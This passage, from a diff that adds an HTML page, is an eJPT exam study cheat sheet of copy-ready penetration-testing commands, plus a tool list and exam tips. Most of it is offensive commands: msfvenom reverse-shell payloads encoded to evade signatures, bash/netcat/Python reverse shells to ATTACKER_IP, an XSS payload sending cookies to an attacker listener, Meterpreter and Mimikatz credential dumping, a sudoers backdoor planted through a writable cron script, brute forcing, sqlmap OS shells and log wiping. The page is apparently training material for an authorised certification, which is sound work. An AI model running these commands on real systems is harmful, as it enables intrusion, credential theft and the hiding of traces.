+nmap -sV --script ssl-heartbleed -p 443 <span class="v">&lt;TARGET_IP&gt;</span>
+
+<span class="c"># BlueKeep (CVE-2019-0708)</span>
+use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+
+<span class="c"># Log4Shell</span>
+nmap --script log4shell.nse --script-args log4shell.callback-server=<span class="v">&lt;CALLBACK_IP&gt;</span>:1389 -p 8080 <span class="v">&lt;TARGET_IP&gt;</span></pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">searchsploit.sh</span><button class="copy">copy</button></div>
+            <pre>searchsploit -u                       <span class="c"># update database</span>
+searchsploit <span class="v">&lt;service name and version&gt;</span>
+searchsploit -m <span class="v">&lt;EXPLOIT_ID&gt;</span>         <span class="c"># copy to cwd</span>
+searchsploit -x <span class="v">&lt;EXPLOIT_ID&gt;</span>         <span class="c"># examine before running</span>
+searchsploit remote linux ssh
+searchsploit -w remote windows smb | grep -i eternalblue</pre>
+          </div>
+        </div>
+      </details>
+
+      <!-- 6 -->
+      <details class="catgroup" data-cat>
+        <summary class="cat-head"><span class="idx">06</span><h3>Metasploit &amp; Meterpreter</h3><span class="count">3 panels</span><span class="chev">›</span></summary>
+        <div class="cat-body">
+          <p class="cat-desc">The framework commands you'll reuse in almost every exploitation task on the exam.</p>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">msf-core.sh</span><button class="copy">copy</button></div>
+            <pre>service postgresql start &amp;&amp; msfconsole -q
+db_status
+
+setg RHOSTS <span class="v">&lt;TARGET_IP&gt;</span>
+workspace -a <span class="v">&lt;NAME&gt;</span>
+
+search <span class="v">&lt;STRING&gt;</span>
+search cve:2017 type:exploit platform:windows
+use <span class="v">&lt;MODULE_PATH&gt;</span>
+show options
+set <span class="v">&lt;OPTION&gt;</span> <span class="v">&lt;VALUE&gt;</span>
+exploit   <span class="c"># or: run</span>
+
+sessions
+sessions -i 1
+sessions -u 1      <span class="c"># shell → meterpreter upgrade</span></pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">db-and-nmap-import.sh</span><button class="copy">copy</button></div>
+            <pre>nmap -Pn -sV -O <span class="v">&lt;TARGET_IP&gt;</span> -oX scan.xml
+db_import scan.xml
+<span class="c"># or scan straight into the DB</span>
+db_nmap -Pn -sV -O <span class="v">&lt;TARGET_IP&gt;</span>
+
+hosts
+services
+vulns
+loot
+creds</pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">meterpreter-basics.sh</span><button class="copy">copy</button></div>
+            <pre>sysinfo
+getuid
+getprivs
+getsystem
+
+ps
+migrate <span class="v">&lt;PID&gt;</span>
+shell
+
+hashdump
+download <span class="v">&lt;remote&gt;</span> <span class="v">&lt;local&gt;</span>
+upload <span class="v">&lt;local&gt;</span> <span class="v">&lt;remote&gt;</span>
+
+load kiwi
+creds_all</pre>
+          </div>
+        </div>
+      </details>
+
+      <!-- 7 -->
+      <details class="catgroup" data-cat>
+        <summary class="cat-head"><span class="idx">07</span><h3>Payloads &amp; Shells</h3><span class="count">3 panels</span><span class="chev">›</span></summary>
+        <div class="cat-body">
+          <p class="cat-desc">Generating payloads, catching them, and the one-liners for when you land on a box without Metasploit.</p>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">msfvenom.sh</span><button class="copy">copy</button></div>
+            <pre><span class="c"># Windows x64</span>
+msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<span class="v">&lt;LHOST&gt;</span> LPORT=<span class="v">&lt;LPORT&gt;</span> -f exe &gt; payload.exe
+
+<span class="c"># Linux x64</span>
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<span class="v">&lt;LHOST&gt;</span> LPORT=<span class="v">&lt;LPORT&gt;</span> -f elf &gt; payload.elf
+
+<span class="c"># PHP web shell</span>
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<span class="v">&lt;LHOST&gt;</span> LPORT=<span class="v">&lt;LPORT&gt;</span> -f raw &gt; shell.php
+
+<span class="c"># Encoded to dodge basic signatures</span>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="v">&lt;LHOST&gt;</span> LPORT=<span class="v">&lt;LPORT&gt;</span> -e x86/shikata_ga_nai -i 10 -f exe &gt; payload_enc.exe
+
+<span class="c"># Catch it</span>
+use multi/handler
+set payload <span class="v">&lt;same as above&gt;</span>
+set LHOST <span class="v">&lt;LHOST&gt;</span>
+set LPORT <span class="v">&lt;LPORT&gt;</span>
+run</pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">netcat-shells.sh</span><button class="copy">copy</button></div>
+            <pre><span class="c"># Listener on attacker box</span>
+nc -nvlp <span class="v">&lt;PORT&gt;</span>
+
+<span class="c"># Reverse shell one-liners (run on target)</span>
+bash -i &gt;&amp; /dev/tcp/<span class="v">&lt;ATTACKER_IP&gt;</span>/<span class="v">&lt;PORT&gt;</span> 0&gt;&amp;1
+nc.exe -nv <span class="v">&lt;ATTACKER_IP&gt;</span> <span class="v">&lt;PORT&gt;</span> -e cmd.exe
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<span class="v">&lt;ATTACKER_IP&gt;</span>",<span class="v">&lt;PORT&gt;</span>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+<span class="c"># Transfer a file over the same listener</span>
+python3 -m http.server 8080</pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">stabilize-tty.sh</span><button class="copy">copy</button></div>
+            <pre>python3 -c 'import pty; pty.spawn("/bin/bash")'
+<span class="c"># background with Ctrl+Z, then on attacker box:</span>
+stty raw -echo; fg
+<span class="c"># press Enter, then:</span>
+export TERM=xterm
+export SHELL=/bin/bash
+reset</pre>
+          </div>
+        </div>
+      </details>
+
+      <!-- 8 -->
+      <details class="catgroup" data-cat>
+        <summary class="cat-head"><span class="idx">08</span><h3>Windows Exploitation &amp; Privesc</h3><span class="count">3 panels</span><span class="chev">›</span></summary>
+        <div class="cat-body">
+          <p class="cat-desc">Local enumeration, the manual checks, and the usual escalation paths — UAC, tokens, and stray credentials.</p>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">win-local-enum.sh</span><button class="copy">copy</button></div>
+            <pre>whoami /priv
+whoami /groups
+systeminfo
+wmic qfe list brief
+schtasks /query /fo LIST /v
+
+net users
+net localgroup administrators
+dir /s /b "*.conf*"
+
+<span class="c"># Automated</span>
+winpeas.exe
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"</pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">win-stray-creds.sh</span><button class="copy">copy</button></div>
+            <pre>type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+findstr /si password *.xml *.ini *.txt *.config
+dir C:\Users\<span class="v">&lt;USER&gt;</span>\AppData\Local\Microsoft\Credentials
+cmdkey /list
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
+type C:\unattend.xml 2&gt;nul</pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">token-impersonation.sh</span><button class="copy">copy</button></div>
+            <pre><span class="c"># Meterpreter — access token impersonation</span>
+getuid
+load incognito
+list_tokens -u
+impersonate_token "NT AUTHORITY\SYSTEM"
+getuid
+
+<span class="c"># Dump creds once elevated</span>
+load kiwi
+creds_all
+lsa_dump_sam
+sekurlsa::logonPasswords</pre>
+          </div>
+        </div>
+      </details>
+
+      <!-- 9 -->
+      <details class="catgroup" data-cat>
+        <summary class="cat-head"><span class="idx">09</span><h3>Linux Exploitation &amp; Privesc</h3><span class="count">2 panels</span><span class="chev">›</span></summary>
+        <div class="cat-body">
+          <p class="cat-desc">The enumeration checklist and the three classic escalation vectors: SUID binaries, cron jobs, and sudo misconfigurations.</p>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">linux-local-enum.sh</span><button class="copy">copy</button></div>
+            <pre>sudo -l
+find / -perm -4000 -type f 2&gt;/dev/null      <span class="c"># SUID</span>
+find / -writable -type d 2&gt;/dev/null
+cat /etc/crontab; crontab -l
+id; groups; uname -a
+cat /etc/passwd | grep -v nologin
+docker ps 2&gt;/dev/null
+
+<span class="c"># Automated</span>
+./linpeas.sh
+./pspy64</pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">suid-and-cron.sh</span><button class="copy">copy</button></div>
+            <pre><span class="c"># SUID binary abuse (check GTFOBins for the binary found)</span>
+find / -user root -perm -4000 -exec ls -ldb {} \; 2&gt;/dev/null
+
+<span class="c"># Writable cron script</span>
+printf '#!/bin/bash\necho "<span class="v">&lt;USER&gt;</span> ALL=NOPASSWD:ALL" &gt;&gt; /etc/sudoers' &gt; /path/to/cron_script.sh
+
+<span class="c"># sudo misconfig example — user can run 'man' as root</span>
+sudo man ls
+<span class="k">!/bin/bash</span></pre>
+          </div>
+        </div>
+      </details>
+
+      <!-- 10 -->
+      <details class="catgroup" data-cat>
+        <summary class="cat-head"><span class="idx">10</span><h3>Credential Attacks &amp; Cracking</h3><span class="count">2 panels</span><span class="chev">›</span></summary>
+        <div class="cat-body">
+          <p class="cat-desc">Online brute-forcing with Hydra and offline cracking once you have a hash dump.</p>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">hydra.sh</span><button class="copy">copy</button></div>
+            <pre>hydra -l <span class="v">&lt;USER&gt;</span> -P /usr/share/wordlists/rockyou.txt <span class="v">&lt;TARGET_IP&gt;</span> ssh
+hydra -L <span class="v">&lt;USERS&gt;</span> -P <span class="v">&lt;PASSWORDS&gt;</span> <span class="v">&lt;TARGET_IP&gt;</span> smb -t 4
+hydra -l admin -P /usr/share/wordlists/rockyou.txt <span class="v">&lt;TARGET_IP&gt;</span> \
+  http-post-form "/login.php:user=^USER^&amp;pass=^PASS^:F=incorrect"
+
+<span class="c">-l / -L single or list of users   -p / -P single or list of passwords</span>
+<span class="c">-t parallel tasks   -f stop on first hit   -V verbose</span></pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">cracking.sh</span><button class="copy">copy</button></div>
+            <pre>gzip -d /usr/share/wordlists/rockyou.txt.gz
+
+<span class="c"># John</span>
+john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+unshadow passwd shadow &gt; unshadowed.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+
+<span class="c"># Hashcat</span>
+hashcat -a 0 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt   <span class="c"># NTLM</span>
+hashcat -a 0 -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt   <span class="c"># sha512crypt</span>
+hashcat -a 0 -m 1000 --show hashes.txt</pre>
+          </div>
+        </div>
+      </details>
+
+      <!-- 11 -->
+      <details class="catgroup" data-cat>
+        <summary class="cat-head"><span class="idx">11</span><h3>Post-Exploitation &amp; Pivoting</h3><span class="count">3 panels</span><span class="chev">›</span></summary>
+        <div class="cat-body">
+          <p class="cat-desc">What to grab once you have a shell, how to route through a compromised host into a second subnet, and basic cleanup.</p>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">post-exploit-enum.sh</span><button class="copy">copy</button></div>
+            <pre><span class="c"># Windows — Meterpreter</span>
+run post/windows/gather/enum_logged_on_users
+use post/windows/gather/checkvm
+use post/windows/gather/enum_applications
+
+<span class="c"># Linux — Meterpreter</span>
+use post/linux/gather/enum_system
+use post/linux/gather/enum_network
+use post/multi/gather/ssh_creds</pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">pivoting.sh</span><button class="copy">copy</button></div>
+            <pre><span class="c"># Meterpreter session on TARGET1, pivot to TARGET2's subnet</span>
+run autoroute -s <span class="v">&lt;TARGET1_SUBNET&gt;</span>
+run autoroute -p
+
+background
+use auxiliary/scanner/portscan/tcp
+set RHOSTS <span class="v">&lt;TARGET2_IP&gt;</span>
+set PORTS 1-1000
+run
+
+<span class="c"># Port forward a specific service through TARGET1</span>
+portfwd add -l <span class="v">&lt;LOCAL_PORT&gt;</span> -p <span class="v">&lt;TARGET2_PORT&gt;</span> -r <span class="v">&lt;TARGET2_IP&gt;</span></pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">clearing-tracks.sh</span><button class="copy">copy</button></div>
+            <pre><span class="c"># Meterpreter</span>
+clearev
+
+<span class="c"># Linux shell</span>
+history -c
+cat /dev/null &gt; ~/.bash_history</pre>
+          </div>
+        </div>
+      </details>
+
+      <!-- 12 -->
+      <details class="catgroup" data-cat>
+        <summary class="cat-head"><span class="idx">12</span><h3>Network Traffic Analysis</h3><span class="count">2 panels</span><span class="chev">›</span></summary>
+        <div class="cat-body">
+          <p class="cat-desc">Wireshark/tshark filters for pulling credentials and session data out of a capture.</p>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">wireshark-filters.txt</span><button class="copy">copy</button></div>
+            <pre>ip.addr == <span class="v">&lt;IP&gt;</span> and tcp.port == <span class="v">&lt;PORT&gt;</span>
+tcp.flags.syn == 1 and tcp.flags.ack == 0
+http contains "password"
+eapol                               <span class="c"># WPA handshake frames</span></pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">tshark.sh</span><button class="copy">copy</button></div>
+            <pre>tshark -r <span class="v">&lt;FILE&gt;</span>.pcap -Y "http.request.method==GET"
+tshark -r <span class="v">&lt;FILE&gt;</span>.pcap -Y "http contains password"
+tshark -r <span class="v">&lt;FILE&gt;</span>.pcap -Y "ip.src==<span class="v">&lt;IP&gt;</span> &amp;&amp; http" -Tfields -e http.user_agent
+tshark -r <span class="v">&lt;FILE&gt;</span>.pcap -z io,phs -q           <span class="c"># protocol hierarchy</span></pre>
+          </div>
+        </div>
+      </details>
+
+      <!-- 13 -->
+      <details class="catgroup" data-cat>
+        <summary class="cat-head"><span class="idx">13</span><h3>Web Application Attacks</h3><span class="count">4 panels</span><span class="chev">›</span></summary>
+        <div class="cat-body">
+          <p class="cat-desc">Where the Web Application Penetration Testing domain lives: directory brute-forcing, SQLi with sqlmap, XSS, and WordPress.</p>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">dir-fuzzing.sh</span><button class="copy">copy</button></div>
+            <pre>gobuster dir -u http://<span class="v">&lt;TARGET_IP&gt;</span> -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.txt -r
+ffuf -w wordlist.txt -u http://<span class="v">&lt;TARGET_IP&gt;</span>/FUZZ -mc 200,301
+nikto -h http://<span class="v">&lt;TARGET_IP&gt;</span> -o niktoscan.txt</pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">sqlmap.sh</span><button class="copy">copy</button></div>
+            <pre><span class="c"># Confirm the injection</span>
+sqlmap -u "http://<span class="v">&lt;TARGET_IP&gt;</span>/item.php?id=1" -p id
+
+<span class="c"># Enumerate</span>
+sqlmap -u "http://<span class="v">&lt;TARGET_IP&gt;</span>/item.php?id=1" --dbs
+sqlmap -u "http://<span class="v">&lt;TARGET_IP&gt;</span>/item.php?id=1" -D <span class="v">&lt;DB&gt;</span> --tables
+sqlmap -u "http://<span class="v">&lt;TARGET_IP&gt;</span>/item.php?id=1" -D <span class="v">&lt;DB&gt;</span> -T <span class="v">&lt;TABLE&gt;</span> --dump
+
+<span class="c"># Authenticated / POST</span>
+sqlmap -u "http://<span class="v">&lt;TARGET_IP&gt;</span>/login.php" --data="user=admin&amp;pass=admin" --dbs
+sqlmap -r request.req --dbs
+
+<span class="c"># Shell out</span>
+sqlmap -u "http://<span class="v">&lt;TARGET_IP&gt;</span>/item.php?id=1" --os-shell</pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">xss-and-login-brute.sh</span><button class="copy">copy</button></div>
+            <pre><span class="c"># Reflected XSS probe</span>
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+<span class="c"># Cookie exfil to an attacker-controlled listener</span>
+&lt;script&gt;new Image().src="http://<span class="v">&lt;ATTACKER_IP&gt;</span>/log.php?q="+document.cookie&lt;/script&gt;
+
+<span class="c"># Login form brute-force</span>
+hydra -L <span class="v">&lt;USERS&gt;</span> -P <span class="v">&lt;PASSWORDS&gt;</span> <span class="v">&lt;TARGET_IP&gt;</span> \
+  http-post-form "/login.php:login=^USER^&amp;password=^PASS^:Invalid credentials"</pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">wordpress.sh</span><button class="copy">copy</button></div>
+            <pre>wpscan --url http://<span class="v">&lt;TARGET_IP&gt;</span> -e vp,vt,u
+wpscan --url http://<span class="v">&lt;TARGET_IP&gt;</span> --usernames admin --passwords /usr/share/wordlists/rockyou.txt
+
+<span class="c"># wp-config.php holds the DB credentials; theme files under</span>
+<span class="c"># /wp-content/themes/&lt;theme&gt;/404.php are a common RCE drop point</span>
+<span class="c"># once you have admin — edit via Appearance → Theme File Editor.</span></pre>
+          </div>
+        </div>
+      </details>
+    </div>
+
+    <p class="no-results" id="noResults">No commands match that filter.</p>
+  </section>
+
+  <section id="tools">
+    <div class="eyebrow">Toolbox</div>
+    <h2>The tools you'll actually reach for</h2>
+    <p class="section-sub">Everything above is built around this short list. Know each one's core flags cold before exam day.</p>
+    <div class="tool-grid">
+      <div class="tool-card"><div class="t-name">Nmap</div><div class="t-desc">Port scanning, service/OS detection, and NSE scripts for vuln checks.</div></div>
+      <div class="tool-card"><div class="t-name">Metasploit / Meterpreter</div><div class="t-desc">Exploitation framework, session handling, and post-exploitation modules.</div></div>
+      <div class="tool-card"><div class="t-name">Hydra</div><div class="t-desc">Online brute-force across SSH, FTP, RDP, SMB, and HTTP forms.</div></div>
+      <div class="tool-card"><div class="t-name">John / Hashcat</div><div class="t-desc">Offline hash cracking for NTLM, shadow hashes, and more.</div></div>
+      <div class="tool-card"><div class="t-name">Gobuster / FFUF</div><div class="t-desc">Directory, file, and vhost fuzzing against web targets.</div></div>
+      <div class="tool-card"><div class="t-name">SQLMap</div><div class="t-desc">Automated detection and exploitation of SQL injection.</div></div>
+      <div class="tool-card"><div class="t-name">Enum4linux / SMBMap</div><div class="t-desc">SMB share, user, and null-session enumeration.</div></div>
+      <div class="tool-card"><div class="t-name">Wireshark / TShark</div><div class="t-desc">Packet capture analysis for creds and session data.</div></div>
+      <div class="tool-card"><div class="t-name">WPScan</div><div class="t-desc">WordPress plugin, theme, and user enumeration.</div></div>
+      <div class="tool-card"><div class="t-name">Netcat</div><div class="t-desc">Listeners, banner grabbing, and manual file transfer.</div></div>
+      <div class="tool-card"><div class="t-name">LinPEAS / WinPEAS</div><div class="t-desc">Automated local privilege-escalation enumeration.</div></div>
+      <div class="tool-card"><div class="t-name">Burp Suite</div><div class="t-desc">Intercepting proxy for manual web app testing.</div></div>
+    </div>
+  </section>
+
+  <section id="exam">
+    <div class="eyebrow">Exam Day</div>
+    <h2>How the certification works</h2>
+    <p class="section-sub">Confirmed details from INE Security's certification page, plus general strategy worth keeping in mind.</p>
+    <div class="tips">
+      <div class="tip"><span class="n">01</span><span class="b"><strong>Entry-level, hands-on.</strong> eJPT simulates real engagement tasks — assessment methodology, host/network auditing and pentesting, and web app testing — rather than asking multiple-choice theory questions in isolation.</span></div>
+      <div class="tip"><span class="n">02</span><span class="b"><strong>Weight your prep by domain.</strong> Host &amp; Network Penetration Testing carries the most weight at 35%, with Assessment Methodologies and Host &amp; Network Auditing close behind at 25% each — comfort with Metasploit, pivoting, and credential attacks pays off more than any single topic.</span></div>
+      <div class="tip"><span class="n">03</span><span class="b"><strong>Mind the voucher clock.</strong> A regular voucher expires 180 days after purchase, and if you don't pass on the first attempt, the included free retake has to happen within 14 days — both attempts must land before the voucher expires.</span></div>
+      <div class="tip"><span class="n">04</span><span class="b"><strong>Results come fast.</strong> Scoring is automated, with a section-by-section breakdown usually delivered within a few hours — use it to see which domain needs more practice before any retake.</span></div>
+      <div class="tip"><span class="n">05</span><span class="b"><strong>Certification lasts three years.</strong> From the date it's awarded, after which INE's renewal options keep the credential current.</span></div>
+    </div>
+  </section>
+
+  <section id="author">
+    <div class="eyebrow">Contact</div>
+    <h2>Who put this together</h2>
+    <div class="author">
+      <div class="avatar"></div>
+      <div class="who">
+        <div class="name">Davud Qasimov</div>
+        <div class="role">Community Content Contributor @ INE</div>
+        <div class="links">
+          <a href="https://www.linkedin.com/in/davud-qasimov" target="_blank" rel="noopener">LinkedIn ↗</a>
+          <a href="https://github.com/DavudQasimov" target="_blank" rel="noopener">GitHub ↗</a>
+          <a href="https://medium.com/@qasimovdavud39" target="_blank" rel="noopener">Medium ↗</a>
+        </div>
+      </div>
+    </div>
+  </section>
+
+
+
+</div>
+
+<script>
+(function(){
+  document.querySelectorAll('.term').forEach(function(term){
+    var btn = term.querySelector('.copy');
+    var pre = term.querySelector('pre');
+    if(!btn || !pre) return;
+    btn.addEventListener('click', function(){
+      var text = pre.textContent;
+      function done(){
+        btn.textContent = 'copied'; btn.classList.add('copied');
+        setTimeout(function(){ btn.textContent='copy'; btn.classList.remove('copied'); }, 1400);
+      }
+      if(navigator.clipboard && navigator.clipboard.writeText){
+        navigator.clipboard.writeText(text).then(done).catch(function(){ fallbackCopy(pre, done); });
+      } else {
+        fallbackCopy(pre, done);
+      }
+    });
+  });
+  function fallbackCopy(pre, done){
+    try{
+      var range = document.createRange();
+      range.selectNodeContents(pre);
+      var sel = window.getSelection();
+      sel.removeAllRanges(); sel.addRange(range);
+      done();
+    }catch(e){}
+  }
+
+  var input = document.getElementById('filterInput');
+  var cats = Array.prototype.slice.call(document.querySelectorAll('[data-cat]'));
+  var noResults = document.getElementById('noResults');
+  input.addEventListener('input', function(){
+    var q = input.value.trim().toLowerCase();
+    var anyVisible = false;
+    cats.forEach(function(cat){
+      var terms = Array.prototype.slice.call(cat.querySelectorAll('[data-term]'));
+      if(q===''){
+        terms.forEach(function(t){ t.hidden = false; });
+        cat.hidden = false;
+        anyVisible = true;
+        return;
+      }
+      var catMatch = false;
+      terms.forEach(function(t){
+        var match = t.textContent.toLowerCase().indexOf(q) !== -1;
+        t.hidden = !match;
+        if(match) catMatch = true;
+      });
+      cat.hidden = !catMatch;
+      if(catMatch){ cat.open = true; anyVisible = true; }
+    });
+    noResults.style.display = anyVisible ? 'none' : 'block';
+  });
+})();
+</script>
+
+</body></html>
